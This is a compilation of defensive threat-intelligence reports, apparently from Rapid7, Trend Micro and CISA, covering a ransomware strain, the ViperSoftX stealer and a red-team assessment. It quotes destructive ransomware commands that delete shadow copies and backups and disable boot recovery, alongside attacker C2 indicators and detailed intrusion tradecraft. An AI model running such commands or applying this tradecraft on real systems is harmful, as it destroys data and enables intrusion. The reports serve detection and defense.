Will then call ImpersonateLoggedOnUser using the token in the response from LogonUserW.-low-key--low-keyEncrypt files and open ransom note, if local filesystem is to be encrypted, but do not spawn other binaries (vssadmin.exe, WMIC.exe, wbadmin.exe, bcdedit.exe) to perform other destructive actions for impact.
Will also skip enumeration and stopping of antivirus software.-no-local--no-localDo not encrypt local files-no-mounted--no-mountedDo not encrypted mounted filesystems-no-discovery--no-discoveryDo not enumerate or encrypt file shares on the network-local-only--local-onlyOnly encrypt local file systems-network-only--network-onlyOnly encrypt file shares on the network.-explicit-only--explicit-onlyOnly encrypt files in this specific path specified-min-size--min-sizeOnly encrypt files greater than or equal to a specific number of bytes-t-timer--timerDo not encrypt files until after specified number of secondsBy default, the ransomware will execute the following child processes with the following arguments:Use of vssadmin.exe in order to delete shadow copies of files which deletes unencrypted backups of files they are attempting to ransom:"C:\Windows\System32\vssadmin.exe" delete shadows /all /quietUse of wmic.exe to create calls that also delete all shadow copies of files which deletes unencrypted backups of files they are attempting to ransom:"C:\Windows\System32\wbem\WMIC.exe" shadowcopy deleteUse of wbadmin.exe to delete backup catalogs:"C:\Windows\System32\wbadmin.exe" delete systemstatebackup"C:\Windows\System32\wbadmin.exe" delete catalog-quiet"C:\Windows\System32\wbadmin.exe" delete systemstatebackup -keepVersions:3Use of bcdedit.exe to disable automatic repair and ignore errors when booting:"C:\Windows\System32\bcdedit.exe" /set
{default} recoveryenabled No"C:\Windows\System32\bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailuresLastly, also opening up notepad.exe to display the ransom note with instructions to the victim on how to pay:"C:\Windows\System32\notepad.exe" C:\HOW_TO_DECRYPT.txtRapid7 ProtectionRapid7 has detections in place within InsightIDR through Insight Agent to detect this type of ransomware activity.
However, since the malicious actor is rebooting into safemode minimal state, endpoint protection software and networking will not be running while the endpoint is executing ransomware.
So, identifying the actions of a malicious actor before ransomware is deployed is crucial to preventing the attack.
In other words, it is essential to identify malicious actors within the environment and eject them before the ransomware payload is dropped.
The following detections are now available InsightIDR to identify this attacker behavior.
Attacker Technique - Auto Logon Count Set OnceAttacker Technique - Potential Process Hollowing To DLLHostAttacker Technique - Shutdown With Message Used By Malicious ActorsAttacker Technique - URL Passed To BitsAdminLateral Movement - Enable RDP via reg.exeSuspicious Process - BCDEdit Enabling SafebootSuspicious Process - Boot Configuration Data Editor ActivitySuspicious Process - DLLHost With No Arguments Spawns ProcessSuspicious Process - Rundll32.exe With No Arguments Spawns ProcessSuspicious Process - ShadowCopy Delete Passed To WMICSuspicious Process - Volume Shadow Service Delete Shadow CopiesIOC's TypeValueRegistry KeyHKLM\System\CurrentControlSet\Control\Terminal ServerRegistry ValueType: DWORD Name: fDenyTSConnections
Value: 0Filenamerdp.batFilenamefile1.batFilenamefile2.batFilenameint.7zFilenameint64.exeMD589ea20880a6aae021940a8166ff85ee8SHA14af769fb3109c754bc879201c61242217a674a2eSHA256067af912ceddb1ea181490f2b3b5a323efcac61c82207833cda70c21c84460cbFilenameint.exeMD58fba0d57696ccf672ddcea4ba4d0e885SHA131097a7f91d182755fc63ebf023bff54cda5ae9cSHA256184a0f96cef09408b192767b405b0266403c9ec429945c1a78703f04f18c7416IP Address79.137.206[.]47FQDNpaloaltocloud[.]onlineFQDNmaxkey[.]onlineFQDNkeycloud[.]liveFQDNmicrocloud[.]onlineFQDNmicrocloud[.]liveIP Address194.135.24[.]241IP Address179.43.142[.]230IP Address77.73.133[.]80IP Address77.73.134[.]27IP Address77.73.134[.]10MITRE
ATT&CKTechniquesT1021 - Remote ServicesT1021.001 -
Remote Desktop ProtocolT1021.002 - SMB/Windows Admin SharesT1027 - Obfuscated Files Or InformationT1027.009 - Embedded PayloadsT1037 - Boot Or Logon Initialization ScriptsT1037.003 - Network Logon ScriptT1059 - Command And Scripting InterpreterT1059.001 - PowerShellT1059.003 - Windows Command ShellT1070 - Indicator RemovalT1080 - Taint Shared ContentT1105 - Ingress Tool TransferT1112 - Modify RegistryT1135 - Network Share DiscoveryT1136 -
Create AccountT1136.001 - Local AccountT1140 - Deobfuscate/Decode Files Or InformationT1197 - BITS JobsT1480 - Execution GuardrailsT1484 - Domain Policy ModificationT1484.001 - Group Policy ModificationT1485 - Data DestructionT1486 - Data Encrypted For ImpactT1489 - Service StopT1490 - Inhibit System RecoveryT1529 - System Shutdown/RebootT1547 - Boot Or Logon Autostart ExecutionT1560 - Archive Collected DataT1560.001 -
Archive Via UtilityT1562 - Impair DefensesT1562.001 - Disable Or Modify ToolsT1562.009 - Safe Mode BootT1570 - Lateral Tool TransferSoftwareS0029 - PSExecS0075 - RegS0190 - BITSAdminS0154 - Cobalt StrikeJakob Denlinger conducted malware analysis for this report. 
title: ViperSoftX Updates Encryption, Steals Data url: https://www.trendmicro.com/en_us/research/23/d/vipersoftx-updates-encryption-steals-data.html ViperSoftX Updates Encryption, Steals Data We observed cryptocurrency and information stealer ViperSoftX evading initial loader detection and making its lure more believable by making the initial package loader via cracks, keygens, activators, and packers non-malicious.
We also noted more sophisticated encryption and basic anti-analysis techniques, such as byte remapping and web browser communication blocking. 
By: Don Ovid Ladores April 24, 2023Read time: ( words) Save to Folio Subscribe ViperSoftX, a type of information-stealing software, has been primarily reported as focusing on cryptocurrencies, making headlines in 2022 for its execution technique of hiding malicious code inside log files.
Since it was first documented in November, we observed this malware campaign differentiating itself from its previous iteration with the use of DLL sideloading for its arrival and execution technique.
We also noted that this update includes a more sophisticated encryption method of byte remapping and a monthly change in command-and- control (C&C) server.
Without the correct byte map, the encrypted shellcode, including all components and relevant data, cannot be correctly decrypted, making decryption and analysis of the shellcode more time-consuming for analysts. 
We’ve noted a significant number of victims in the consumer and enterprise sectors, with Australia, Japan, and the United States as the top three countries affected by ViperSoftX in the consumer category.
Meanwhile, victim organizations from Southeast Asian countries comprised the enterprise sector. 
Figure 1.
Top 10 countries affected by ViperSoftX in both the consumer and enterprise sectors Source: Trend Micro™ Smart Protection Network™ (SPN) Arrival routine For majority of cases, ViperSoftX typically arrives as a software crack, an activator or a patcher, or a key generator (keygen).
In blocking and detecting these illicit software solutions, we have come to believe that the people behind these kinds of software try to convince users looking for bootleg software versions that these are not malicious and are simply flagged as “false positives.”
It is also a common gimmick for cybercriminals to pose malware as a keygen or an activator.
Actors behind ViperSoftX take this narrative a step further by using actual non-malicious software to hide and pose as typical illegal software versions.
ViperSoftX uses these files as “carriers” of the main malware encrypted within the overlay. 
While the malicious actors abuse neither definitive software nor target any definitive applications, they commonly use multimedia editors or video format converters, cryptocurrency coinminer apps, phone-related desktop apps, and system cleaner apps.
Through all the samples we analyzed, we consistently observed the following binary carriers: gup.exe from Notepad++ firefox.exe from Tor ErrorReportClient.exe from Magix, a type of multimedia-editing software Figure 2.
Typical arrival package of the malware The malware arrives as a package of the carrier executable and the decryptor/loader DLL, typically downloaded from the websites or torrents of (illegal) software solutions.
For the most part, the malware is posed as a software activator, patcher, or keygen, among other similar software executables.
The malicious routine starts after the software executables have been included and run in the system. 
We also noticed that ViperSoftX’s primary C&C servers for the second stage download would change on a monthly basis: 
February: chatgigi2[.]com March: arrowlchat[.]com April: static-cdn-349[.]net Infection routine Figure 3.
Execution flow of ViperSoftX ViperSoftX first checks for a few virtualization strings and monitoring tools to check if the system is running a virtual machine (VM).
Using WQL command SELECT Manufacturer, Model FROM Win32_ComputerSystem to query ROOT\CIMV2, it checks for the following strings: VMWare Virtual The malware checks if there are monitoring tools, specifically Process Monitor, running in the current machine with the following strings: procmon procmon64 procmon64a Lastly, ViperSoftX checks for a few installed and active antivirus products, namely: Windows Defender ESET 
If all checks pass, the malware proceeds to decrypt the PowerShell code and starts downloading the main ViperSoftX routine.
From there, the routine is its standard multistage download and execution routine. 
Figure 4.
Execution of the first-stage PowerShell downloader after passing through blacklisting Unique encryption Byte mapping is a considerably simple technique.
It does not require any complex computations, and the only operation it requires is to put the correct byte in the correct location.
For their part, cybercriminals benefit from this malware as it reduces the presence and actions made by a large graph of objects. 
Unlike the typical bitwise operations from typical decryption routines, ViperSoftX uses byte remapping to ensure that the shellcode cannot be easily decrypted without the correct byte map, weaving a cross-stitch template to the palette of 256 (0x100h) bytes.
Though this is a very rigid method of hiding its codes, it provides some level of protection against forced decryption. 
Figure 5.
Comparison of two ViperSoftX carrier executables with byte remapping. 
Note: The bytes of the encrypted section is a specific index on the byte map found in the sideloaded DLL.
Comparing the mapping of the first four bytes on two samples shows that their offsets within the encrypted region remain the same since they result in a similar shellcode even if they are composed of different bytes per binary. 
When the screenshots of the two carrier executables are compared, the number (or code) changed but the location/offset remains the same.
The same is true for all the other bytes.
While analysts will see the pattern of the arrangement, it is unlikely that they would be able to decrypt this without the correct sequence of bytes used in the mapping.
If this pattern is a text or a string, it would not be difficult to apply brute force.
However, considering this is a byte character (with 256 different bytes) and an assembly code instruction at that, brute-forcing it would unlikely yield correctly decrypted results. 
We have also found that each sideloader DLL has its own pair of executable and byte map, and a decryption attempt returns an incorrectly rearranged shellcode if used with another ViperSoftX-related executable.
This ensures that the shellcode will not be decrypted without the correct DLL since the latter contains the correct byte map.
Moreover, all the strings, binaries, and other relevant data within the ViperSoftX DLL also gets decrypted the same way.
Afterward, the shellcode will then decrypt and load the main ViperSoftX DLL embedded within the carrier. 
Figure 6.
ViperSoftX DLL containing the hard-coded byte map (256 bytes long denoting specific bytes from “0x00” to “0xff”) Figure 7.
The actual bytes of the decrypted shellcode This technique for encryption-decryption is not new but is mostly popular with script malware.
As of this writing, the most recent piece of malware that uses this technique is the JavaScript- or Windows Scripting File-packed Magniber ransomware.
Considering the former is a type of script malware, however, this technique for encryption-decryption is easily more discernable during analysis because both the encrypted data and the mapping are in the same file.
In contrast to our ViperSoftX sample, which is a full binary file, the table becomes harder to find.
Furthermore, since the data to be decrypted is in another file, the routine becomes even more difficult to investigate, as analysts would need the correct pair for decryption. 
Password theft Since it was first documented, ViperSoftX has been known as a cryptocurrency stealer.
However, we found from our investigations that ViperSoftX can check not only for cryptocurrencies but also for a few password managers.
It also uses some basic anti-C&C analyses by disallowing communications using web browsers. 
Figure 8.
Response when accessing the C&C via web browsers (top), and modifying the user-agent to access the C&C and return encoded data (bottom) 
It still downloads a PowerShell code (the main ViperSoftX script) to crawl through different paths in the system for cryptocurrency wallets.
ViperSoftX scans for these cryptocurrency wallets in local directories: Armory Atomic Wallet Binance Bitcoin Blockstream Green Coinomi Delta Electrum Exodus Guarda Jaxx Liberty Ledger Live Trezor Bridge 
The malware also checks for the following wallets via browser extensions: Binance Coin98 Coinbase Jaxx Liberty MetaMask Mew CX (now Enkrypt) 
Install browser components: Brave Browser Chrome Firefox Microsoft Edge Opera The updated version of ViperSoftX includes a check mechanism for two password managers, namely KeePass 2 and 1Password.
Noting the malware’s capability to scann KeePass, we looked into the possible abuse of the KeePass security gap CVE-2023-24055, which forces the application to dump stored passwords in plain text (a feature already disabled in recent patches and versions).
According to our investigation, although there are low numbers of victims related to the exploit, the said detections do not appear related to ViperSoftX victims. 
Figure 9.
PowerShell code searching for the browser link files to inject a command line and load malicious extensions Figure 10.
ViperSoftX
scanning browser extensions and directories for wallets and password managers Victims affected: Consumers and businesses alike Due to the nature of its arrival technique, we primarily assumed that the targets and victims would be regular users.
However, we were surprised to see that the enterprise sector made up over 40% of the total number of victims.
It is also notable that the leading countries and regions affected by the malware campaign are Australia and Japan with almost the same numbers, while US came at a close third with almost half as much victims at the consumer level.
On the other hand, the majority of the affected enterprise sector can be found in Asia. 
Figure 11.
Top 10 countries affected by ViperSoftX malware in the enterprise (top) and consumer (bottom) sectors Source: Trend Micro Smart Protection Network (SPN) Conclusion and insights While other cybercriminals use sideloading to load another non-binary component (usually the encrypted payload, which comes together as a package with the normal executable and the sideloaded DLL), the chosen techniques of the actors behind ViperSoftX (which involve using WMI Query Language (WQL), DLL sideloading/DLL load order hijacking, PowerShell reflective loading, browser hijacking, and C&C protection) are sophisticated. 
The cybercriminals behind ViperSoftX are also skilled enough to execute a seamless chain for malware execution while staying under the radar of authorities by selecting one of the most effective methods for delivering malware to consumers.
Although we have observed some changes throughout their campaigns, the pace of ViperSoftX’s development can be considered slow compared to other types of stealer malware. 
The group behind this malware has been doing this for a number of years, and it knows its target systems based on the simultaneous use of techniques to steal cryptocurrencies and passwords.
In this respect, we believe there are actually at least two groups responsible for this ViperSoftX campaign based on the malware’s C&C communication.
As the first set of players, the main group is responsible for the deployments.
On the other hand, considering the monthly change of C&C servers and communication exchange, we believe in the possibility of another group involved based on the different coding or C&C scheme.
ViperSoftX uses a domain-generating algorithm (DGA) to hide its C&C server and generate useless traffic.
From the DGA technique, we observed that majority of the activities are dominated by the main group, which utilizes a simple DGA.
However, there are a number of activities that appear to use a different DGA.
We do not discount the possibility that these can either be older samples or different operators entirely. 
While ViperSoftX appears to be targeting consumers considering its chosen means for entry, we found it interesting that it also affects the business sector.
One possible theory behind why businesses are affected by this campaign has to do with recent layoffs and possible budget cuts.
While some users might be looking to freelance and upend their incomes while in between jobs, others might have been prompted to download tools from unofficial platforms to “save costs” and circumvent tools not found in office-issued devices.
Nonetheless, we strongly recommend that users download the software and applications they need from official platforms.
Cracks and other illegally owned software will only work for certain periods since majority of license verification methods are now done in the cloud.
If features such as updates to circumvent the replacement of cracks or patches are disabled, users would then be putting their respective systems at greater risk of attacks or infections. 
Here are some additional recommendations to prevent the risks of infection from malware types like ViperSoftX: Download software and applications from official platforms and sources. 
Instead of downloading illegal software, choose alternative freeware solutions from reputable sources and platforms. 
Download security solutions that can detect and block malicious components in seemingly legitimate and non-malicious software and applications. 
Trend Micro solutions Trend Micro customers are protected from threats like ViperSoftX with Trend Micro Vision One™, which provides multilayered protection and behavior detection, thereby blocking questionable behavior and tools before a piece of malware can do any damage.
Implementing a multifaceted approach can aid organizations in securing potential entry points into their systems such as endpoint, email, web, and network.
With the help of security solutions that can identify malevolent elements and questionable activities, enterprises can be safeguarded via automated protection while also ensuring that no significant incidents go unnoticed. Indicators of Compromise (IOCs) 
The list of IOCs can be downloaded here. 
Authors Don Ovid Ladores Threats Analyst 
title: CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-059a SUMMARY The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory (CSA) detailing activity and key findings from a recent CISA red team assessment—in coordination with the assessed organization—to provide network defenders recommendations for improving their organization's cyber posture. 
Actions to take today to harden your local environment: Establish a security baseline of normal network activity; tune network and host-based appliances to detect anomalous behavior. 
Conduct regular assessments to ensure appropriate procedures are created and can be followed by security staff and end users. 
Enforce phishing-resistant MFA to the greatest extent possible. 
In 2022, CISA conducted a red team assessment (RTA) at the request of a large critical infrastructure organization with multiple geographically separated sites.
The team gained persistent access to the organization’s network, moved laterally across the organization’s multiple geographically separated sites, and eventually gained access to systems adjacent to the organization’s sensitive business systems (SBSs).
Multifactor authentication (MFA) prompts prevented the team from achieving access to one SBS, and the team was unable to complete its viable plan to compromise a second SBSs within the assessment period. 
Despite having a mature cyber posture, the organization did not detect the red team’s activity throughout the assessment, including when the team attempted to trigger a security response. 
CISA is releasing this CSA detailing the red team’s tactics, techniques, and procedures (TTPs) and key findings to provide network defenders of critical infrastructure organizations proactive steps to reduce the threat of similar activity from malicious cyber actors.
This CSA highlights the importance of collecting and monitoring logs for unusual activity as well as continuous testing and exercises to ensure your organization’s environment is not vulnerable to compromise, regardless of the maturity of its cyber posture. 
CISA encourages critical infrastructure organizations to apply the recommendations in the Mitigations section of this CSA—including conduct regular testing within their security operations center—to ensure security processes and procedures are up to date, effective, and enable timely detection and mitigation of malicious activity. 
Download the PDF version of this report: CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks (PDF, 1.06 MB ) TECHNICAL DETAILS Note: This advisory uses the MITRE ATT&CK:registered: for Enterprise framework, version 12.
See the appendix for a table of the red team’s activity mapped to MITRE ATT&CK tactics and techniques. 
Introduction CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to Federal and non-Federal entities with respect to cybersecurity risks.
(See generally 6 U.S.C. §§ 652[c][5], 659[c][6].)
After receiving a request for a red team assessment (RTA) from an organization and coordinating some high-level details of the engagement with certain personnel at the organization, CISA conducted the RTA over a three-month period in 2022. 
During RTAs, a CISA red team emulates cyber threat actors to assess an organization’s cyber detection and response capabilities.
During Phase I, the red team attempts to gain and maintain persistent access to an organization’s enterprise network while avoiding detection and evading defenses.
During Phase II, the red team attempts to trigger a security response from the organization’s people, processes, or technology. 
The “victim” for this assessment was a large organization with multiple geographically separated sites throughout the United States.
For this assessment, the red team’s goal during Phase I was to gain access to certain sensitive business systems (SBSs). 
Phase I: Red Team Cyber Threat Activity Overview The organization’s network was segmented with both logical and geographical boundaries.
CISA’s red team gained initial access to two organization workstations at separate sites via spearphishing emails.
After gaining access and leveraging Active Directory (AD) data, the team gained persistent access to a third host via spearphishing emails.
From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC).
They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server.
The team used this root access to move laterally to SBS-connected workstations.
However, a multifactor authentication (MFA) prompt prevented the team from achieving access to one SBS, and Phase I ended before the team could implement a seemingly viable plan to achieve access to a second SBS. 
Initial Access and Active Directory Discovery The CISA red team gained initial access [TA0001] to two workstations at geographically separated sites (Site 1 and Site 2) via spearphishing emails.
The team first conducted open-source research [TA0043] to identify potential targets for spearphishing.
Specifically, the team looked for email addresses [T1589.002] as well as names
[T1589.003] that could be used to derive email addresses based on the team’s identification of the email naming scheme.
The red team sent tailored spearphishing emails to seven targets using commercially available email platforms [T1585.002].
The team used the logging and tracking features of one of the platforms to analyze the organization’s email filtering defenses and confirm the emails had reached the target’s inbox. 
The team built a rapport with some targeted individuals through emails, eventually leading these individuals to accept a virtual meeting invite.
The meeting invite took them to a red team-controlled domain [T1566.002] with a button, which, when clicked, downloaded a “malicious” ISO file [T1204].
After the download, another button appeared, which, when clicked, executed the file. 
Two of the seven targets responded to the phishing attempt, giving the red team access to a workstation at Site 1 (Workstation 1) and a workstation at Site 2.
On Workstation 1, the team leveraged a modified SharpHound collector, ldapsearch, and command-line tool, dsquery, to query and scrape AD information, including AD users
[T1087.002], computers [T1018], groups [T1069.002], access control lists (ACLs), organizational units (OU), and group policy objects (GPOs)
[T1615].
Note:
SharpHound is a BloodHound collector, an open-source AD reconnaissance tool.
Bloodhound has multiple collectors that assist with information querying. 
There were 52 hosts in the AD that had Unconstrained Delegation enabled and a lastlogon timestamp within 30 days of the query.
Hosts with Unconstrained Delegation enabled store Kerberos ticket-granting tickets (TGTs) of all users that have authenticated to that host.
Many of these hosts, including a Site 1 SharePoint server, were Windows Server 2012R2.
The default configuration of Windows Server 2012R2 allows unprivileged users to query group membership of local administrator groups. 
The red team queried parsed Bloodhound data for members of the SharePoint admin group and identified several standard user accounts with administrative access.
The team initiated a second spearphishing campaign, similar to the first, to target these users.
One user triggered the red team’s payload, which led to installation of a persistent beacon on the user’s workstation (Workstation 2), giving the team persistent access to Workstation 2. Lateral Movement, Credential Access, and Persistence The red team moved laterally
[TA0008] from Workstation 2 to the Site 1 SharePoint server and had SYSTEM level access to the Site 1 SharePoint server, which had Unconstrained Delegation enabled.
They used this access to obtain the cached credentials of all logged-in users—including the New Technology Local Area Network Manager (NTLM) hash for the SharePoint server account.
To obtain the credentials, the team took a snapshot of lsass.exe
[T1003.001] with a tool called nanodump, exported the output, and processed the output offline with Mimikatz. 
The team then exploited the Unconstrained Delegation misconfiguration to steal the DC’s TGT.
They ran the DFSCoerce python script (DFSCoerce.py), which prompted DC authentication to the SharePoint server using the server’s NTLM hash.
The team then deployed Rubeus to capture the incoming DC TGT [T1550.002], [T1557.001].
(DFSCoerce abuses Microsoft's Distributed File System [MS-DFSNM] protocol to relay authentication against an arbitrary server.[1]) 
The team then used the TGT to harvest advanced encryption standard (AES)-256 hashes via DCSync
[T1003.006] for the krbtgt account and several privileged accounts—including domain admins, workstation admins, and a system center configuration management (SCCM) service account (SCCM Account 1).
The team used the krbtgt account hash throughout the rest of their assessment to perform golden ticket attacks [T1558.001] in which they forged legitimate TGTs.
The team also used the asktgt command to impersonate accounts they had credentials for by requesting account TGTs [T1550.003]. 
The team first impersonated the SCCM Account 1 and moved laterally to a Site 1 SCCM distribution point (DP) server (SCCM Server 1) that had direct network access to Workstation 2.
The team then moved from SCCM Server 1 to a central SCCM server (SCCM Server 2) at a third site (Site 3).
Specifically, the team: Queried the AD using Lightweight Directory Access Protocol (LDAP) for information about the network's sites and subnets [T1016].
This query revealed all organization sites and subnets broken down by classless inter-domain routing (CIDR) subnet and description. 
Used LDAP queries and domain name system (DNS) requests to identify recently active hosts. 
Listed existing network connections
[T1049] on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2. Attempted to move laterally to the SCCM Server 2 via AppDomain hijacking, but the HTTPS beacon failed to call back. 
Attempted to move laterally with an SMB beacon
[T1021.002], which was successful. 
The team also moved from SCCM Server 1 to a Site 1 workstation (Workstation 3) that housed an active server administrator.
The team impersonated an administrative service account via a golden ticket attack (from SCCM Server 1); the account had administrative privileges on Workstation 3.
The user employed a KeePass password manager that the team was able to use to obtain passwords for other internal websites, a kernel-based virtual machine (KVM) server, virtual private network (VPN) endpoints, firewalls, and another KeePass database with credentials.
The server administrator relied on a password manager, which stored credentials in a database file.
The red team pulled the decryption key from memory using KeeThief and used it to unlock the database [T1555.005]. 
At the organization’s request, the red team confirmed that SCCM Server 2 provided access to the organization’s sites because firewall rules allowed SMB traffic to SCCM servers at all other sites. 
The team moved laterally from SCCM Server 2 to an SCCM DP server at Site 5 and from the SCCM Server 1 to hosts at two other sites (Sites 4 and 6).
The team installed persistent beacons at each of these sites.
Site 5 was broken into a private and a public subnet and only DCs were able to cross that boundary.
To move between the subnets, the team moved through DCs.
Specifically, the team moved from the Site 5 SCCM DP server to a public DC; and then they moved from the public DC to the private DC.
The team was then able to move from the private DC to workstations in the private subnet. 
The team leveraged access available from SCCM 2 to move around the organization’s network for post-exploitation activities (See Post-Exploitation Activity section). 
See Figure 1 for a timeline of the red team’s initial access and lateral movement showing key access points. 
Figure 1: Red Team Cyber Threat Activity: Initial Access and Lateral MovementWhile traversing the network, the team varied their lateral movement techniques to evade detection and because the organization had non-uniform firewalls between the sites and within the sites (within the sites, firewalls were configured by subnet).
The team’s primary methods to move between sites were AppDomainManager hijacking and dynamic-link library (
DLL) hijacking
[T1574.001].
In some instances, they used Windows Management Instrumentation (WMI)
Event Subscriptions
[T1546.003]. 
The team impersonated several accounts to evade detection while moving.
When possible, the team remotely enumerated the local administrators group on target hosts to find a valid user account.
This technique relies on anonymous SMB pipe binds
[T1071], which are disabled by default starting with Windows Server 2016.
In other cases, the team attempted to determine valid accounts based on group name and purpose.
If the team had previously acquired the credentials, they used asktgt to impersonate the account.
If the team did not have the credentials, they used the golden ticket attack to forge the account. 
Post-Exploitation Activity: Gaining Access to SBSs With persistent, deep access established across the organization’s networks and subnetworks, the red team began post-exploitation activities and attempted to access SBSs.
Trusted agents of the organization tasked the team with gaining access to two specialized servers (SBS 1 and SBS 2).
The team achieved root access to three SBS-adjacent workstations but was unable to move laterally to the SBS servers: 
Phase I ended before the team could implement a plan to move to SBS 1. 
An MFA prompt blocked the team from moving to SBS 2, and Phase I ended before they could implement potential workarounds. 
However, the team assesses that by using Secure Shell (SSH) session socket files (see below), they could have accessed any hosts available to the users whose workstations were compromised. Plan for Potential Access to SBS 1 Conducting open-source research
[1591.001], the team identified that SBS 1 and 2 assets and associated management/upkeep staff were located at Sites 5 and 6, respectively.
Adding previously collected AD data to this discovery, the team was able to identify a specific SBS 1 admin account.
The team planned to use the organization’s mobile device management (MDM) software to move laterally to the SBS 1 administrator’s workstation and, from there, pivot to SBS 1 assets. 
The team identified the organization’s MDM vendor using open-source and AD information [T1590.006] and moved laterally to an MDM distribution point server at Site 5 (MDM DP 1).
This server contained backups of the MDM MySQL database on its D: drive in the Backup directory.
The backups included the encryption key needed to decrypt any encrypted values, such as SSH passwords [T1552].
The database backup identified both the user of the SBS 1 administrator account (USER 2) and the user’s workstation (Workstation 4), which the MDM software remotely administered. 
The team moved laterally to an MDM server (MDM 1) at Site 3, searched files on the server, and found plaintext credentials [T1552.001] to an application programming interface (API) user account stored in PowerShell scripts.
The team attempted to leverage these credentials to browse to the web login page of the MDM vendor but were unable to do so because the website directed to an organization-controlled single-sign on (SSO) authentication page. 
The team gained root access to workstations connected to MDM 1—specifically, the team accessed Workstation 4—by: Selecting an MDM user from the plaintext credentials in PowerShell scripts on MDM 1. 
While in the MDM MySQL database, Elevating the selected MDM user’s account privileges to administrator privileges, and Modifying the user’s account by adding Create Policy and Delete Policy permissions [T1098], [T1548]. Creating a policy via the MDM API [T1106], which instructed Workstation 4 to download and execute a payload to give the team interactive access as root to the workstation. 
Verifying their interactive access. 
Resetting permissions back to their original state by removing the policy via the MDM API and removing Create Policy and Delete Policy and administrator permissions and from the MDM user’s account. 
While interacting with Workstation 4, the team found an open SSH socket file and a corresponding netstat connection to a host that the team identified as a bastion host from architecture documentation found on Workstation 4.
The team planned to move from Workstation 4 to the bastion host to SBS 1.
Note: A SSH socket file allows a user to open multiple SSH sessions through a single, already authenticated SSH connection without additional authentication. 
The team could not take advantage of the open SSH socket.
Instead, they searched through SBS 1 architecture diagrams and documentation on Workstation 4.
They found a security operations (SecOps) network diagram detailing the network boundaries between Site 5 SecOps on-premises systems, Site 5 non-SecOps on-premises systems, and Site 5 SecOps cloud infrastructure.
The documentation listed the SecOps cloud infrastructure IP ranges [T1580].
These “trusted” IP addresses were a public /16 subnet; the team was able to request a public IP in that range from the same cloud provider, and Workstation 4 made successful outbound SSH connections to this cloud infrastructure.
The team intended to use that connection to reverse tunnel traffic back to the workstation and then access the bastion host via the open SSH socket file.
However, Phase 1 ended before they were able to implement this plan. 
Attempts to Access SBS 2 Conducting open-source research, the team identified an organizational branch [T1591] that likely had access to SBS 2.
The team queried the AD to identify the branch’s users and administrators.
The team gathered a list of potential accounts, from which they identified administrators, such as SYSTEMS ADMIN or DATA SYSTEMS ADMINISTRATOR, with technical roles.
Using their access to the MDM MySQL database, the team queried potential targets to (1) determine the target’s last contact time with the MDM and (2) ensure any policy targeting the target’s workstation would run relatively quickly [T1596.005].
Using the same methodology as described by the steps in the Plan for Potential Access to SBS 1 section above, the team gained interactive root access to two Site 6 SBS 2-connected workstations: a software engineering workstation (Workstation 5) and a user administrator workstation (Workstation 6). 
The Workstation 5 user had bash history files with what appeared to be SSH passwords mistyped into the bash prompt and saved in bash history
[T1552.003].
The team then attempted to authenticate to SBS 2 using a similar tunnel setup as described in the Access to SBS 1 section above and the potential credentials from the user’s bash history file.
However, this attempt was unsuccessful for unknown reasons. 
On Workstation 6, the team found a .txt file containing plaintext credentials for the user.
Using the pattern discovered in these credentials, the team was able to crack the user’s workstation account password
[T1110.002].
The team also discovered potential passwords and SSH connection commands in the user’s bash history.
Using a similar tunnel setup described above, the team attempted to log into SBS 2.
However, a prompt for an MFA passcode blocked this attempt. 
See figure 2 for a timeline of the team’s post exploitation activity that includes key points of access. 
Figure 2: Red Team Cyber Threat Activity: Post ExploitationCommand and Control The team used third-party owned and operated infrastructure and services
[T1583] throughout their assessment, including in certain cases for command and control (C2)
[TA0011].
These included: Cobalt Strike and Merlin payloads for C2 throughout the assessment.
Note: Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic. 
The team maintained multiple Cobalt Strike servers hosted by a cloud vendor.
They configured each server with a different domain and used the servers for communication with compromised hosts.
These servers retained all assessment data. 
Two commercially available cloud-computing platforms. 
The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers [T1090.002].
Redirecting servers make it difficult for defenders to attribute assessment activities to the backend team servers.
The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers
[T1071.002].
The team encrypted all data in transit [T1573] using encryption keys stored on team’s Cobalt Strike servers. 
A cloud service to rapidly change the IP address of the team’s redirecting servers in the event of detection and eradication. 
Content delivery network (CDN) services to further obfuscate some of the team’s C2 traffic. 
This technique leverages CDNs associated with high-reputation domains so that the malicious traffic appears to be directed towards a reputation domain but is actually redirected to the red team-controlled Cobalt Strike servers. 
The team used domain fronting [T1090.004] to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating.
This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team’s redirect server. Phase II: Red Team Measurable Events Activity 
The red team executed 13 measurable events designed to provoke a response from the people, processes, and technology defending the organization’s network.
See Table 1 for a description of the events, the expected network defender activity, and the organization’s actual response. 
Table 1: Measurable Events Measurable Event Description MITRE ATT&CK Technique(s) Expected Detection Points Expected Network Defender Reactions Reported Reactions Internal Port Scan Launch scan from inside the network from a previously gained workstation to enumerate ports on target workstation, server, and domain controller system(s). 
Network Service Discovery [T1046] Network Monitoring and Analysis Tools Intrusion Detection or Prevention Systems Endpoint Protection Platform Detect target hosts and ports Identify associated scanning process Analyze scanning host once detected Develop response plan None Comprehensive Active Directory and Host Enumeration Perform AD enumeration by querying all domain objects from the DC; and enumerating trust relationships within the AD Forest, user accounts, and current session information from every domain computer (Workstation and Server). 
Domain Trust Discovery [T1482] Account Discovery: Domain Account
[T1087.002] System Owner/User Discovery [T1033] Remote System Discovery [T1018] Network Monitoring and Analysis Tools Intrusion Detection or Prevention Systems Endpoint Protection Platform Detect target hosts and ports Identify associated scanning process Analyze scanning host once detected Develop response plan Collection process stopped before completion.
Host isolated and sent for forensics. 
